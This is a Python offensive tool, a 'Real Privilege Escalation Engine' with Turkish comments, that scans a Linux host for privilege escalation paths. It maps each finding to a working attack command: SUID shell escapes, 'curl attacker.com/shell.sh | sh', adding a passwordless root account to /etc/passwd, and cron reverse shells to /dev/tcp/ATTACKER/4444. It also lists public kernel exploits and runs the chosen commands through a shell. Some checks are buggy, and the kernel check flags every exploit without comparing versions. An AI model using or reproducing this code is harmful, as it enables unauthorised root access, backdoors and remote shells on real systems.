#!/usr/bin/env python3
"""
Real Privilege Escalation Engine
Gerçek root sızma teknikleri - USE RESPONSIBLY!
"""

import subprocess
import os
import stat
from typing import List, Dict, Any
from dataclasses import dataclass


@dataclass
class PrivescVector:
    """Privilege escalation vector"""
    name: str
    severity: str
    command: str
    description: str
    success_rate: float


class RealPrivescEngine:
    """Real privilege escalation engine"""
    
    def __init__(self):
        self.vectors = []
        self.current_user = self._get_current_user()
        self.is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def _get_current_user(self) -> str:
        """Get current username"""
        try:
            return os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        except:
            return 'unknown'
    
    def scan_all_vectors(self) -> List[PrivescVector]:
        """Scan for all privilege escalation vectors"""
        vectors = []
        
        if not self.is_root:
            vectors.extend(self.check_suid_binaries())
            vectors.extend(self.check_sudo_misconfig())
            vectors.extend(self.check_writable_etc())
            vectors.extend(self.check_cron_exploits())
            vectors.extend(self.check_kernel_exploits())
            vectors.extend(self.check_capabilities())
            vectors.extend(self.check_docker_escape())
        
        self.vectors = vectors
        return vectors
    
    def check_suid_binaries(self) -> List[PrivescVector]:
        """Find exploitable SUID binaries"""
        vectors = []
        
        # Known exploitable SUID binaries
        exploitable_bins = {
            'nmap': 'nmap --interactive\n!sh',
            'vim': 'vim -c \':!sh\'',
            'find': 'find . -exec /bin/sh \\; -quit',
            'bash': 'bash -p',
            'more': 'more /etc/passwd\n!/bin/sh',
            'less': 'less /etc/passwd\n!/bin/sh',
            'nano': 'nano /etc/shadow (then Ctrl+R Ctrl+X)',
            'cp': 'cp /bin/sh /tmp/sh && chmod +s /tmp/sh',
            'mv': 'mv /etc/shadow /tmp/ (if writable)',
            'awk': 'awk \'BEGIN {system("/bin/sh")}\'',
            'perl': 'perl -e \'exec "/bin/sh";\'',
            'python': 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
            'python3': 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
            'ruby': 'ruby -e \'exec "/bin/sh"\'',
            'lua': 'lua -e \'os.execute("/bin/sh")\'',
            'wget': 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh',
            'curl': 'curl http://attacker.com/shell.sh | sh',
            'git': 'git help config\n!/bin/sh',
            'tar': 'tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh',
            'zip': 'zip /tmp/test.zip testfile -T --unzip-command="sh -c /bin/sh"',
            'docker': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
            'screen': 'screen -X readbuf /etc/shadow'
        }
        
        try:
            # Find SUID binaries
            result = subprocess.run(
                ['find', '/', '-perm', '-u=s', '-type', 'f', '2>/dev/null'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            suid_files = result.stdout.strip().split('\n')
            
            for filepath in suid_files:
                if not filepath:
                    continue
                    
                binary_name = os.path.basename(filepath)
                
                if binary_name in exploitable_bins:
                    vectors.append(PrivescVector(
                        name=f"SUID: {binary_name}",
                        severity="HIGH",
                        command=exploitable_bins[binary_name],
                        description=f"Exploitable SUID binary: {filepath}",
                        success_rate=0.8
                    ))
        
        except Exception as e:
            print(f"Error scanning SUID: {e}")
        
        return vectors
    
    def check_sudo_misconfig(self) -> List[PrivescVector]:
        """Check sudo misconfigurations"""
        vectors = []
        
        try:
            # Check sudo -l
            result = subprocess.run(
                ['sudo', '-l'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            output = result.stdout.lower()
            
            # Check for NOPASSWD
            if 'nopasswd' in output:
                vectors.append(PrivescVector(
                    name="Sudo NOPASSWD",
                    severity="CRITICAL",
                    command="sudo -l (check which commands)",
                    description="User can run sudo commands without password",
                    success_rate=0.95
                ))
            
            # Check for dangerous sudo permissions
            dangerous_cmds = ['vim', 'nano', 'less', 'more', 'man', 'find', 'bash', 'sh']
            for cmd in dangerous_cmds:
                if cmd in output:
                    vectors.append(PrivescVector(
                        name=f"Sudo {cmd.upper()}",
                        severity="HIGH",
                        command=f"sudo {cmd}",
                        description=f"Can run {cmd} with sudo - shell escape possible",
                        success_rate=0.9
                    ))
        
        except:
            pass
        
        return vectors
    
    def check_writable_etc(self) -> List[PrivescVector]:
        """Check writable /etc files"""
        vectors = []
        
        critical_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/etc/crontab',
            '/etc/cron.d/',
            '/etc/rc.local'
        ]
        
        for filepath in critical_files:
            try:
                if os.path.exists(filepath):
                    st = os.stat(filepath)
                    # Check if writable by user
                    if st.st_mode & stat.S_IWOTH or (st.st_mode & stat.S_IWGRP and os.getgid() == st.st_gid):
                        vectors.append(PrivescVector(
                            name=f"Writable {filepath}",
                            severity="CRITICAL",
                            command=f"echo 'root2::0:0:root:/root:/bin/bash' >> {filepath}" if 'passwd' in filepath else f"echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' >> {filepath}",
                            description=f"Critical file {filepath} is writable!",
                            success_rate=1.0
                        ))
            except:
                pass
        
        return vectors
    
    def check_cron_exploits(self) -> List[PrivescVector]:
        """Check for exploitable cron jobs"""
        vectors = []
        
        cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/crontabs/'
        ]
        
        try:
            # Check crontab entries
            result = subprocess.run(
                ['cat', '/etc/crontab'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        # Check if script is writable
                        parts = line.split()
                        if len(parts) > 6:
                            script_path = parts[6]
                            try:
                                if os.path.exists(script_path):
                                    st = os.stat(script_path)
                                    if st.st_mode & stat.S_IWOTH:
                                        vectors.append(PrivescVector(
                                            name=f"Writable Cron Script",
                                            severity="HIGH",
                                            command=f"echo '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > {script_path}",
                                            description=f"Cron script {script_path} is writable",
                                            success_rate=0.85
                                        ))
                            except:
                                pass
        except:
            pass
        
        return vectors
    
    def check_kernel_exploits(self) -> List[PrivescVector]:
        """Check for known kernel exploits"""
        vectors = []
        
        kernel_exploits = {
            "Dirty COW": {
                "cve": "CVE-2016-5195",
                "kernel": ["2.6.22", "4.8.3"],
                "command": "gcc -pthread dirtyc0w.c -o dirtyc0w; ./dirtyc0w /etc/passwd",
                "url": "https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
            },
            "Dirty Pipe": {
                "cve": "CVE-2022-0847",
                "kernel": ["5.8", "5.16.11"],
                "command": "gcc exploit.c -o exploit; ./exploit /etc/passwd 1 ootz:",
                "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
            },
            "PwnKit": {
                "cve": "CVE-2021-4034",
                "kernel": ["any"],
                "command": "gcc pwnkit.c -o pwnkit; ./pwnkit",
                "url": "https://github.com/arthepsy/CVE-2021-4034"
            },
            "Sudo Baron Samedit": {
                "cve": "CVE-2021-3156",
                "kernel": ["any"],
                "command": "./exploit",
                "url": "https://github.com/blasty/CVE-2021-3156"
            }
        }
        
        try:
            # Get kernel version
            result = subprocess.run(
                ['uname', '-r'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            kernel_ver = result.stdout.strip()
            
            # Check if vulnerable
            for name, exploit in kernel_exploits.items():
                vectors.append(PrivescVector(
                    name=f"Kernel Exploit: {name}",
                    severity="CRITICAL",
                    command=f"# {exploit['cve']}\n# Download: {exploit['url']}\n{exploit['command']}",
                    description=f"{name} ({exploit['cve']}) - Check if kernel {kernel_ver} is vulnerable",
                    success_rate=0.7
                ))
        
        except:
            pass
        
        return vectors
    
    def check_capabilities(self) -> List[PrivescVector]:
        """Check for exploitable capabilities"""
        vectors = []
        
        try:
            result = subprocess.run(
                ['getcap', '-r', '/', '2>/dev/null'],
                capture_output=True,
                text=True,
                shell=True,
                timeout=30
            )
            
            dangerous_caps = {
                'cap_setuid': 'Can set UID - use to become root',
                'cap_dac_override': 'Can bypass file permissions',
                'cap_dac_read_search': 'Can read any file',
                'cap_sys_admin': 'Full system admin capabilities'
            }
            
            lines = result.stdout.split('\n')
            for line in lines:
                for cap, desc in dangerous_caps.items():
                    if cap in line.lower():
                        filepath = line.split('=')[0].strip()
                        vectors.append(PrivescVector(
                            name=f"Capability: {cap}",
                            severity="HIGH",
                            command=f"{filepath} # Has {cap}",
                            description=desc,
                            success_rate=0.75
                        ))
        
        except:
            pass
        
        return vectors
    
    def check_docker_escape(self) -> List[PrivescVector]:
        """Check for Docker container escape"""
        vectors = []
        
        # Check if in container
        in_container = os.path.exists('/.dockerenv') or os.path.exists('/run/.containerenv')
        
        if in_container:
            vectors.append(PrivescVector(
                name="Docker Escape",
                severity="HIGH",
                command="# Mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\nchroot /mnt/host",
                description="Running in Docker - possible host escape",
                success_rate=0.6
            ))
        
        # Check if user in docker group
        try:
            result = subprocess.run(
                ['groups'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if 'docker' in result.stdout:
                vectors.append(PrivescVector(
                    name="Docker Group Privesc",
                    severity="CRITICAL",
                    command="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    description="User in docker group - instant root!",
                    success_rate=0.99
                ))
        except:
            pass
        
        return vectors
    
    def exploit_vector(self, vector: PrivescVector) -> Dict[str, Any]:
        """Attempt to exploit a vector"""
        result = {
            'vector': vector.name,
            'attempted': True,
            'success': False,
            'output': '',
            'error': ''
        }
        
        try:
            # WARNING: This actually executes exploits!
            proc = subprocess.run(
                vector.command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            result['success'] = proc.returncode == 0
            result['output'] = proc.stdout
            result['error'] = proc.stderr
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
